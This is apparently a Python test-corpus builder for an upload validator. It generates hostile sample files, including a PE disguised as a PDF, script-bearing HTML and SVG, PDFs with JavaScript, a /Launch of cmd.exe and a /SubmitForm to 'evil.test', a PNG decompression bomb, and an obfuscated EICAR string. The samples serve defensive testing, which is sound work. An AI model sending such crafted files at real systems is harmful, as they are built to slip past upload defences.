"""The C9 upload corpus (plan section 6, C9), built in memory only.

`corpus(max_bytes)` returns a list of Case(group, name, filename, content,
content_type, expected) where expected is a set of acceptable status codes.
Nothing is written to disk here. The EICAR string is assembled at run time
from reversed pieces, so neither this file nor any output file contains it.

    uv run python scripts/verification/make_corpus.py   # prints the case list only
"""

from __future__ import annotations

import io
import zlib
from dataclasses import dataclass

import pikepdf
from PIL import Image, PngImagePlugin

MiB = 1024 * 1024


@dataclass
class Case:
    group: str
    name: str
    filename: str
    content: bytes
    content_type: str
    expected: tuple[int, ...]
    note: str = ""


def eicar() -> bytes:
    # The 68-byte EICAR test string, built backwards from four reversed pieces.
    parts = ["*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$", "}7)CC7)^P(45XZP\\4[PA@%P!O5X"]
    return "".join(p[::-1] for p in reversed(parts)).encode("ascii")


def _font(pdf: pikepdf.Pdf) -> pikepdf.Object:
    return pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.Font, Subtype=pikepdf.Name.Type1,
                                                BaseFont=pikepdf.Name.Helvetica))


def base_pdf(text: str = "Certificate", pages: int = 1) -> pikepdf.Pdf:
    pdf = pikepdf.new()
    f = _font(pdf)
    for i in range(pages):
        pdf.add_blank_page(page_size=(300, 300))
        pg = pdf.pages[i]
        pg.Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=f))
        pg.Contents = pdf.make_stream(f"BT /F1 10 Tf 20 150 Td ({text} {i + 1}) Tj ET".encode("latin-1"))
    return pdf


def save(pdf: pikepdf.Pdf, **kw) -> bytes:
    b = io.BytesIO()
    pdf.save(b, **kw)
    return b.getvalue()


def pdf_with(mod) -> bytes:
    pdf = base_pdf()
    mod(pdf)
    return save(pdf)


def js_openaction(pdf):
    pdf.Root.OpenAction = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert(1)")))


def js_in_object_stream() -> bytes:
    pdf = base_pdf()
    js = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert(2)")))
    pdf.Root.Names = pdf.make_indirect(pikepdf.Dictionary(JavaScript=pikepdf.Dictionary(
        Names=pikepdf.Array([pikepdf.String("a"), js]))))
    return save(pdf, object_stream_mode=pikepdf.ObjectStreamMode.generate, compress_streams=True)


def action(kind: str, **extra):
    def mod(pdf):
        d = pikepdf.Dictionary(S=pikepdf.Name("/" + kind), **extra)
        annot = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link,
                                                     Rect=pikepdf.Array([10, 10, 100, 40]), A=d))
        pdf.pages[0].Annots = pdf.make_indirect(pikepdf.Array([annot]))
    return mod


def embedded_file(payload: bytes):
    def mod(pdf):
        pdf.attachments["note.txt"] = pikepdf.AttachedFileSpec(pdf, payload, mime_type="text/plain")
    return mod


def rich_media(pdf):
    annot = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.RichMedia,
                                                 Rect=pikepdf.Array([10, 10, 100, 40]),
                                                 RichMediaContent=pikepdf.Dictionary()))
    pdf.pages[0].Annots = pdf.make_indirect(pikepdf.Array([annot]))


def xfa(pdf):
    pdf.Root.AcroForm = pdf.make_indirect(pikepdf.Dictionary(Fields=pikepdf.Array([]),
                                                             XFA=pdf.make_stream(b"<xdp:xdp/>")))


def pdf_text(text_bytes: bytes) -> bytes:
    pdf = base_pdf()
    esc = text_bytes.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    pdf.pages[0].Contents = pdf.make_stream(b"BT /F1 8 Tf 10 150 Td (" + esc + b") Tj ET")
    return save(pdf)


def padded_pdf(size: int) -> bytes:
    """A valid PDF of exactly `size` bytes: a harmless uncompressed stream pads it."""
    def build(pad: int) -> bytes:
        pdf = base_pdf()
        pdf.Root.Padding = pdf.make_stream(b"0" * pad)
        return save(pdf, compress_streams=False, stream_decode_level=pikepdf.StreamDecodeLevel.none)
    pad = size - 2000
    for _ in range(6):
        got = len(build(pad))
        if got == size:
            return build(pad)
        pad += size - got
    raise RuntimeError("could not hit size")


def image(fmt: str, w: int = 320, h: int = 200, **save_kw) -> bytes:
    img = Image.new("RGB", (w, h), (120, 160, 200))
    b = io.BytesIO()
    img.save(b, fmt, **save_kw)
    return b.getvalue()


def jpeg_with_gps() -> bytes:
    img = Image.new("RGB", (320, 200), (200, 120, 80))
    exif = Image.Exif()
    exif[0x010F] = "SecretCameraMaker"
    gps = {1: "N", 2: (59.0, 26.0, 0.0), 3: "E", 4: (24.0, 45.0, 0.0)}
    exif[0x8825] = gps
    b = io.BytesIO()
    img.save(b, "JPEG", exif=exif.tobytes())
    return b.getvalue()


def png_with_text() -> bytes:
    img = Image.new("RGB", (320, 200), (80, 200, 120))
    info = PngImagePlugin.PngInfo()
    info.add_text("Comment", "SecretPngComment")
    b = io.BytesIO()
    img.save(b, "PNG", pnginfo=info)
    return b.getvalue()


def zip_bytes() -> bytes:
    import zipfile
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("hidden.txt", "SecretZipPayload")
    return b.getvalue()


def png_bomb(w: int, h: int) -> bytes:
    """A tiny PNG declaring w x h pixels (1-bit grey), all zero."""
    import struct
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    raw = zlib.compress(b"".join(b"\x00" + b"\x00" * ((w + 7) // 8) for _ in range(h)), 9)
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 1, 0, 0, 0, 0))
            + chunk(b"IDAT", raw) + chunk(b"IEND", b""))


PE = b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 400


def corpus(max_bytes: int, max_pages: int) -> list[Case]:
    pdf_ok = save(base_pdf())
    jpg = image("JPEG")
    cases = [
        # Size
        Case("size", "exactly the limit", "limit.pdf", padded_pdf(max_bytes), "application/pdf", (201,)),
        Case("size", "limit + 1 byte", "limit1.pdf", padded_pdf(max_bytes + 1), "application/pdf", (413,)),
        Case("size", "4.4 MB", "big.pdf", padded_pdf(int(4.4 * 1000 * 1000)), "application/pdf", (413,)),
        # Type
        Case("type", ".exe renamed .pdf", "setup.pdf", PE, "application/pdf", (415,)),
        Case("type", ".html", "page.html", b"<html><script>alert(1)</script></html>", "application/pdf", (415,)),
        Case("type", ".svg with script", "img.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/png", (415,)),
        Case("type", "file.pdf.exe", "file.pdf.exe", pdf_ok, "application/pdf", (415,)),
        Case("type", "file.exe.pdf with PE content", "file.exe.pdf", PE, "application/pdf", (415,)),
        Case("type", "no extension", "certificate", pdf_ok, "application/pdf", (415,)),
        Case("type", ".PDF upper case (valid)", "CERT.PDF", pdf_ok, "application/octet-stream", (201,)),
        Case("type", ".jpe", "photo.jpe", jpg, "image/jpeg", (415,)),
        Case("type", "JPEG named .png", "photo.png", jpg, "image/png", (415,)),
        # Damaged
        Case("damaged", "HTML after %PDF-", "fake.pdf", b"%PDF-1.7\n<html><script>alert(1)</script></html>", "application/pdf", (422,)),
        Case("damaged", "truncated PDF", "trunc.pdf", pdf_ok[: len(pdf_ok) // 2], "application/pdf", (422,)),
        Case("damaged", "truncated JPEG", "trunc.jpg", jpg[: len(jpg) // 2], "image/jpeg", (422,)),
        # Active PDF
        Case("active", "JavaScript in OpenAction", "js.pdf", pdf_with(js_openaction), "application/pdf", (422,)),
        Case("active", "JavaScript only in a compressed object stream", "jsobj.pdf", js_in_object_stream(), "application/pdf", (422,)),
        Case("active", "/Launch", "launch.pdf", pdf_with(action("Launch", F=pikepdf.String("cmd.exe"))), "application/pdf", (422,)),
        Case("active", "/EmbeddedFile", "embed.pdf", pdf_with(embedded_file(b"hello")), "application/pdf", (422,)),
        Case("active", "/RichMedia", "rich.pdf", pdf_with(rich_media), "application/pdf", (422,)),
        Case("active", "XFA form", "xfa.pdf", pdf_with(xfa), "application/pdf", (422,)),
        Case("active", "/SubmitForm", "submit.pdf", pdf_with(action("SubmitForm", F=pikepdf.String("http://evil.test/"))), "application/pdf", (422,)),
        Case("active", "/ImportData", "import.pdf", pdf_with(action("ImportData", F=pikepdf.String("data.fdf"))), "application/pdf", (422,)),
        Case("active", "/GoToR", "gotor.pdf", pdf_with(action("GoToR", F=pikepdf.String("other.pdf"), D=pikepdf.Array([0, pikepdf.Name.Fit]))), "application/pdf", (422,)),
        Case("active", "/GoToE", "gotoe.pdf", pdf_with(action("GoToE", D=pikepdf.Array([0, pikepdf.Name.Fit]))), "application/pdf", (422,)),
        Case("active", "ordinary /URI link (control)", "uri.pdf", pdf_with(action("URI", URI=pikepdf.String("https://www.imo.org/"))), "application/pdf", (201,)),
        # Encrypted
        Case("encrypted", "owner password only", "enc_owner.pdf", save(base_pdf(), encryption=pikepdf.Encryption(owner="owner-secret", user="")), "application/pdf", (422,)),
        Case("encrypted", "empty user password, AES-256", "enc_empty.pdf", save(base_pdf(), encryption=pikepdf.Encryption(owner="", user="", R=6)), "application/pdf", (422,)),
        # Image tricks
        Case("image", "JPEG with EXIF GPS", "gps.jpg", jpeg_with_gps(), "image/jpeg", (201,), "stored copy must have no EXIF"),
        Case("image", "JPEG with a ZIP appended", "zip.jpg", image("JPEG") + zip_bytes(), "image/jpeg", (201,), "stored copy must have no trailing ZIP"),
        Case("image", "PNG with text chunks", "text.png", png_with_text(), "image/png", (201,), "stored copy must have no tEXt"),
        Case("image", "60-megapixel PNG (decompression bomb)", "bomb.png", png_bomb(10000, 6000), "image/png", (413, 415, 422)),
        # PDF size
        Case("pdfsize", f"{max_pages + 1} pages (limit {max_pages})", "pages.pdf", save(base_pdf(pages=max_pages + 1)), "application/pdf", (422,)),
        # EICAR
        Case("eicar", "EICAR string as .pdf", "eicar.pdf", eicar(), "application/pdf", (415, 422)),
        Case("eicar", "EICAR as an embedded file in a PDF", "eicar_embed.pdf", pdf_with(embedded_file(eicar())), "application/pdf", (422,)),
        Case("eicar", "EICAR as text inside a valid PDF page", "eicar_text.pdf", pdf_text(eicar()), "application/pdf", (201,), "accepted = no malware scan (ASVS 5.4.3 not met)"),
    ]
    return cases


if __name__ == "__main__":
    for c in corpus(4 * MiB, 50):
        print(f"{c.group:9s} {c.name:48s} {c.filename:18s} {len(c.content):>9d} expect {c.expected}")
